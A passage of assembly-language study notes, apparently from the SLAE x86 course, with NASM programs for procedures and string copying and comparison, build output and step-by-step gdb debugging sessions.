=> 0x08048096 <+22>:	ret    
End of assembler dump.
0x08048096 in HelloWorldProc ()
(gdb) x/2xw $esp
0xbffff708:	0x080480a2	0x00000010
(gdb) nexti
Dump of assembler code for function PrintHelloWorld:
   0x0804809c <+0>:	push   ecx
   0x0804809d <+1>:	call   0x8048080 <HelloWorldProc>
=> 0x080480a2 <+6>:	pop    ecx
   0x080480a3 <+7>:	loop   0x804809c <PrintHelloWorld>
   0x080480a5 <+9>:	mov    eax,0x1
   0x080480aa <+14>:	mov    ebx,0xa
   0x080480af <+19>:	int    0x80
End of assembler dump.
0x080480a2 in PrintHelloWorld ()
(gdb) x/xw $esp
0xbffff70c:	0x00000010
(gdb) c
Continuing.
Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World![Inferior 1 (process 7936) exited with code 012]
Error while running hook_stop:
No frame selected.
(gdb) quit

Save State Exercise:

https://en.wikipedia.org/wiki/Function_prologue

vim Procedure2.nasm

; Filename: Procedure2.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text

HelloWorldProc:

        push ebp
        mov ebp, esp

        ; Print hello world using write syscall


        mov eax, 0x4
        mov ebx, 0x1
        mov ecx, message
        mov edx, mlen
        int 0x80

        ; mov esp, ebp
        ; pop ebp

        leave
        ret   ; signifies end of procedure


_start:

        mov ecx, 0x10

PrintHelloWorld:

        ; preserve registers and flags
        pushad
        pushfd

        call HelloWorldProc

        ; restore registers and flags

        popfd
        popad

        loop PrintHelloWorld



        mov eax, 1
        mov ebx, 10             ; sys_exit syscall

section .data

        message: db "Hello World!"
        mlen     equ $-message
	
./compile.sh Procedure2
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
./Procedure2
Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!

Strings:

MOVS (MOVS/MOVSW/MOVSD)
CMPS - Compares
SCAS - Subtracts
LODS - Loads

vim Strings.nasm

; Filename: Strings.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        ; copy a string from source to destination

        mov ecx, sourceLen
        lea esi, [source]
        lea edi, [destination]


        cld  ; clear direction flag
        rep movsb

        ; Print hello world using write syscall

        mov eax, 0x4
        mov ebx, 0x1
        mov ecx, destination
        mov edx, sourceLen
        int 0x80

        ; string comparison with cmpsb

        ; compare source and destination
        mov ecx, sourceLen
        lea esi, [source]
        lea edi, [destination]
        repe cmpsb

        jz SetEqual
        mov ecx, result2
        mov edx, result2Len
        jmp Print

SetEqual:
        mov ecx, result1
        mov edx, result1Len

Print:
        mov eax, 0x4
        mov ebx, 0x1
        int 0x80


        mov eax, 1
        mov ebx, 10             ; sys_exit syscall
	int 0x80
	
section .data

        source: db "Hello World!", 0xA
        sourceLen equ $-source

        comparison: db "Hello"

        result1: db "Strings are Equal", 0xA
        result1Len equ $-result1

        result2: db "Strings are Unequal", 0xA
        result2Len equ $-result2

section .bss

        destination: resb 100
	
./compile.sh Strings
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
gdb -q ./Strings
Reading symbols from /SLAE x86/Strings/Strings...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run 
Starting program: /SLAE x86/Strings/Strings 

Breakpoint 1, 0x08048080 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
   0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
(gdb) define hook-stop 
Type commands for definition of "hook-stop".
End with a line saying just "end".
>disassemble 
>x/15cb &destination
>end
(gdb) nexti
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
=> 0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
   0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048085 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
=> 0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
   0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x0804808b in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
=> 0x08048091 <+17>:	cld    
   0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048091 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	0 '\000'	0 '\000'	0 '\000'0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	0 '\000'	0 '\000'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	0 '\000'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	0 '\000'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	111 'o'
0x8049130 <destination+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	111 'o'
0x8049130 <destination+8>:	114 'r'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	111 'o'
0x8049130 <destination+8>:	114 'r'	108 'l'	0 '\000'	0 '\000'	0 '\000'	0 '\000'0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	111 'o'
0x8049130 <destination+8>:	114 'r'	108 'l'	100 'd'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
=> 0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	111 'o'
0x8049130 <destination+8>:	114 'r'	108 'l'	100 'd'	33 '!'	0 '\000'	0 '\000'	0 '\000'
0x08048092 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
   0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
=> 0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	111 'o'
0x8049130 <destination+8>:	114 'r'	108 'l'	100 'd'	33 '!'	10 '\n'	0 '\000'	0 '\000'
0x08048094 in _start ()
(gdb) 
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
   0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
=> 0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
0x8049128 <destination>:	72 'H'	101 'e'	108 'l'	108 'l'	111 'o'	32 ' '	87 'W'	111 'o'
0x8049130 <destination+8>:	114 'r'	108 'l'	100 'd'	33 '!'	10 '\n'	0 '\000'	0 '\000'
0x08048099 in _start ()
(gdb) c
Continuing.
Hello World!
Strings are Equal
[Inferior 1 (process 16084) exited with code 012]
Error while running hook_stop:
No frame selected.
(gdb) quit

./Strings 
Hello World!
Strings are Equal
gdb -q ./Strings
Reading symbols from /SLAE x86/Strings/Strings...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) set disassembly-flavor intel
(gdb) run
Starting program: /SLAE x86/Strings/Strings 

Breakpoint 1, 0x08048080 in _start ()
(gdb) disas
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    ecx,0xd
   0x08048085 <+5>:	lea    esi,ds:0x80490f0
   0x0804808b <+11>:	lea    edi,ds:0x8049128
   0x08048091 <+17>:	cld    
   0x08048092 <+18>:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   0x08048094 <+20>:	mov    eax,0x4
   0x08048099 <+25>:	mov    ebx,0x1
   0x0804809e <+30>:	mov    ecx,0x8049128
   0x080480a3 <+35>:	mov    edx,0xd
   0x080480a8 <+40>:	int    0x80
   0x080480aa <+42>:	mov    ecx,0xd
   0x080480af <+47>:	lea    esi,ds:0x80490f0
   0x080480b5 <+53>:	lea    edi,ds:0x8049128
